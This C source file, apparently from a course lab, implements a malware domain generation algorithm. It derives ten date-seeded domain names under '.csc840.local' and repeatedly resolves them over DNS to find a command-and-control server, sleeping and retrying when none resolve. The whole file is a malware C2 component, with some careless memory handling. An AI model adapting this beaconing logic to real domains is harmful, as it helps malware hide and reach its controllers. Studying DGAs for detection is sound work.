// Patrick Sacchet
// Calculate our DGAs and attempt to resolve them via DNS

#include "DGA.h"


// Calculate our seed we will use in our DGA 
int generateSeed(int day, int *seed)
{
    int status = 1;
    char letter;

    letter = rand_letters[day];
    *seed = (int)letter;


cleanup:
    return status;
}


// Using our seed we will construct AGDs to put into our array
int generateAGDs(int seed, char*** agds)
{
    int status = 1, tldIndex = 0, offsetAdd = 0, count = 0;
    char *domEnd = ".csc840.local";

    while (count < 10)
    {
        int agdCount = 0;
        char agd [45] = { 0 }; 

        memset(agd, 0, sizeof(agd));

        while (agdCount < 10)
        {
            int offset = 0;

            if (seed + offsetAdd > RAND_SIZE)
            {
                offset = seed - offsetAdd;
            }

            else
            {
                offset = seed + offsetAdd;
            }

            memcpy(&agd[agdCount], &rand_letters[offset], 1);
            agdCount += 1;

            if (offsetAdd == 127)
            {
                offsetAdd = 0;
            }

            else
            {
                offsetAdd += 1;
            }
        }

        if (tldIndex > 4)
        {
            tldIndex = 0; // Reset our TLD index
        }

        // Append our TLD 
        memcpy(&agd[agdCount], tlds[tldIndex], strlen(tlds[tldIndex]));
        agdCount += strlen(tlds[tldIndex]);
        tldIndex += 1;

        // Append the rest of the domain
        memcpy(&agd[agdCount], domEnd, strlen(domEnd));
        agdCount += strlen(domEnd);

        // Allocate for agds entry
        agds[count] = (char*) malloc(sizeof(char) * strlen(agd) + 1);
        if (agds[count] == NULL)
        {
            printf("OOM!\n");
            status = 0;
            goto cleanup;
        }

        memcpy(agds[count], agd, strlen(agd) + 1);
        count += 1;
    }


cleanup:
    return status;
}


// Walk through our list of DGAs, attempt to resolve each name 
int resolveAddress(char** agds, char** address)
{
    bool found = false;
    int status = 1, index = 0;
    struct hostent *host_info;
    struct in_addr *address_calc;

    // While we still havent found our address
    while(!found)
    {
        // Keep walking our list
        while(index < 10)
        {
            host_info = gethostbyname(agds[index]);
            if (host_info != NULL)
            {
                address_calc = (struct in_addr*) (host_info->h_addr);
                printf("Found IP!: %s\n", inet_ntoa(*address_calc));
                memcpy(*address, (void*)inet_ntoa(*address_calc), 15); // lazy copy 
                found = true;
                break;
            }
            
            index += 1;
        }

        if (!found)
        {
            // We walked the whole list and didn't come up with an address, so sleep and try again
            printf("Failed to resolve domain; analyst is watching... going to sleep...\n");
            index = 0;
            sleep(5);
        }
    }
    

cleanup:
    return status;
}


// Main call-in for DGA/domain resolution functionality 
int determineC2Address(char** address)
{
    int status = 1, seed = 0, day = 0 ;
    time_t now = time(NULL); // current time now
    struct tm *t = localtime(&now); // convert to local time structure
    char* agds [10] = { 0 };

    // Calculate our seed
    if (!generateSeed(t->tm_mday, &seed))
    {
        printf("Failed to calculate seed!\n");
        status = 0;
        goto cleanup;
    }

    printf("Seed is %d\n", seed);

    // Generate our AGDs
    if (!generateAGDs(seed, &agds))
    {
        printf("Failed to generate AGDs!\n");
        status = 0;
        goto cleanup;
    }

    else
    {
        printf("Generated AGDs:\n");
        for (int i=0; i< 10; i++)
        {
            printf("\t%s\n", agds[i]);         
        }
    }

    // Try to resolve each via DNS; sleep if fail all, then retry 
    if (!resolveAddress(agds, address))
    {
        printf("Failed to resolve address!\n");
        status = 0;
        goto cleanup;
    }

    printf("Address for C2 is %s\n", *address);


cleanup:
    // Free agds memory 
    return status;
}